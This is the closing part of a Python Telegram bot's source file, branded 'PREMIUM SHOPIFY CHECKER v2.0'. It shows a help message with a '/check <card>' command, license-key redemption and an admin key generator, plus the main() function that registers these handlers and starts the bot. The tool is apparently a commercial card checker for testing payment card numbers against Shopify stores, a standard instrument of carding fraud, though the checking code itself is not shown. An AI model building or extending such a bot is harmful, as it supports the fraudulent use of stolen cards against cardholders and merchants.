<pre>/check &lt;card&gt; - Single check</pre>
<pre>/stats - Your statistics</pre>
<pre>/redeem &lt;key&gt; - Activate license</pre>

<pre>💎 Premium Features:</pre>
<pre>• Faster processing speeds</pre>
<pre>• Advanced analytics</pre>
<pre>• Priority support</pre>
<pre>• Exclusive features</pre>""",
                parse_mode=ParseMode.HTML
            )


# ═══════════════════════════════════════════════════════════════════════════════
# 🚀 MAIN APPLICATION
# ═══════════════════════════════════════════════════════════════════════════════

def main():
    """Initialize and run the premium bot"""
    if not TELEGRAM_BOT_TOKEN or len(TELEGRAM_BOT_TOKEN) < 20:
        logger.critical("Invalid Telegram Bot Token!")
        return

    print(f"""
╔═══════════════════════════════════════════════════════════╗
║               PREMIUM SHOPIFY CHECKER v2.0                ║
║                     Starting Up...                        ║
╚═══════════════════════════════════════════════════════════╝

🚀 Initializing premium systems...
💎 Loading user profiles...
🔐 Setting up admin controls...
⚡ Ready for premium experience!
""")

    # Initialize bot
    bot = PremiumBot()
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    # Register handlers
    application.add_handler(CommandHandler("start", bot.start_command))
    application.add_handler(CommandHandler("check", bot.check_single_command))
    application.add_handler(CommandHandler("setsite", bot.setsite_command))
    application.add_handler(CommandHandler("stats", bot.stats_command))
    application.add_handler(CommandHandler("redeem", bot.redeem_command))
    
    # Admin commands
    application.add_handler(CommandHandler("admin", bot.admin_panel))
    application.add_handler(CommandHandler("genkey", bot.genkey_command))
    
    # Callback handler
    application.add_handler(CallbackQueryHandler(bot.callback_handler))

    logger.info("🚀 Premium Bot is now running!")
    
    try:
        application.run_polling()
    except KeyboardInterrupt:
        logger.info("Bot stopped by user")
    finally:
        # Clean up
        import asyncio
        try:
            asyncio.run(bot.api_service.close_session())
        except:
            pass


if __name__ == "__main__":
    main()
